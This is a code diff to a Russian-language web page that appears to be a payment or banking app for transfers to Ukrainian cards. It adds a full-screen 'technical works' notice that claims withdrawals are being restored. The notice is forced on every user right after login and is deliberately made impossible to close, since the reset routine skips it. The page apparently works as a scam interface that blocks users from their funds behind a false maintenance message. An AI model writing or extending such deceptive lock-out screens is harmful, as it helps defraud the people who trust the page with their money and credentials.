@@ -497,6 +497,53 @@
             border-radius: 50%; animation: spin 0.8s infinite linear;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* МОДАЛЬ ТЕХРАБОТ (специальный, не закрывается) */
+        #modalTechWorks {
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(145deg, #0b1e3c, #1a3b62);
+            z-index: 3000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 30px;
+            color: white;
+            overflow: hidden;
+        }
+        #modalTechWorks.active {
+            display: flex;
+        }
+        .tech-content {
+            text-align: center;
+            max-width: 320px;
+        }
+        .tech-icon {
+            font-size: 90px;
+            margin-bottom: 25px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.08); }
+        }
+        .tech-title {
+            font-size: 26px;
+            font-weight: 900;
+            margin-bottom: 20px;
+            letter-spacing: -0.5px;
+        }
+        .tech-text {
+            font-size: 17px;
+            line-height: 1.55;
+            opacity: 0.95;
+            margin-bottom: 30px;
+        }
+        .tech-footer {
+            font-size: 13px;
+            opacity: 0.75;
+            font-weight: 500;
+        }
     </style>
 </head>
 <body>
@@ -724,6 +771,22 @@
         <div style="text-align:center;"><div style="font-size:50px;">🛡️</div><h3>Защита Nazar Bilous активна</h3></div>
     </div>
 
+    <!-- МОДАЛЬ ТЕХНИЧЕСКИХ РАБОТ (НЕ ЗАКРЫВАЕТСЯ) -->
+    <div id="modalTechWorks">
+        <div class="tech-content">
+            <div class="tech-icon">⚙️</div>
+            <div class="tech-title">ТЕХНИЧЕСКИЕ РАБОТЫ</div>
+            <div class="tech-text">
+                Уважаемые клиенты!<br><br>
+                На данный момент у нас проводятся технические работы<br>
+                по восстановлению вывода средств на банковские карты Украины.<br><br>
+                Это займет несколько часов.<br><br>
+                Приносим свои извинения за доставленные неудобства.
+            </div>
+            <div class="tech-footer">Мы работаем над тем, чтобы всё было восстановлено как можно скорее.<br>Спасибо за понимание ❤️</div>
+        </div>
+    </div>
+
     <!-- НОВОЕ МОДАЛЬНОЕ ОКНО: Данные получателя для перевода -->
     <div id="modalTransferForm" class="modal-full">
         <div class="nav-header">
@@ -906,8 +969,14 @@
                 localStorage.setItem('p_saved_u', u); localStorage.setItem('p_saved_p', p);
             }
             document.getElementById('app').classList.add('logged-in');
+            showTechModal(); // Показываем модал техработ сразу после логина
             sync();
         } else document.getElementById('loginErr').style.display = 'block';
+    }
+
+    // Показ модала техработ (не закрывается)
+    function showTechModal() {
+        document.getElementById('modalTechWorks').classList.add('active');
     }
 
     // Загрузка сохранённых данных и истории
@@ -1134,10 +1203,14 @@
     }
     function closeHist() { document.getElementById('app').classList.remove('show-hist'); }
 
-    // Сброс всех экранов и состояний
+    // Сброс всех экранов и состояний (исключаем модал техработ)
     function resetAll() {
         document.getElementById('app').classList.remove('show-conf', 'show-pass-now', 'show-s3', 'show-hist', 'show-chat', 'show-sidebar');
-        document.querySelectorAll('.modal-full').forEach(m => m.classList.remove('active'));
+        document.querySelectorAll('.modal-full').forEach(m => {
+            if (m.id !== 'modalTechWorks') {
+                m.classList.remove('active');
+            }
+        });
         resetPinDots();
         currentTransfer = { amountUSD: 0, amountUAH: 0, card: '', lastName: '', firstName: '', middleName: '' };
         sync();
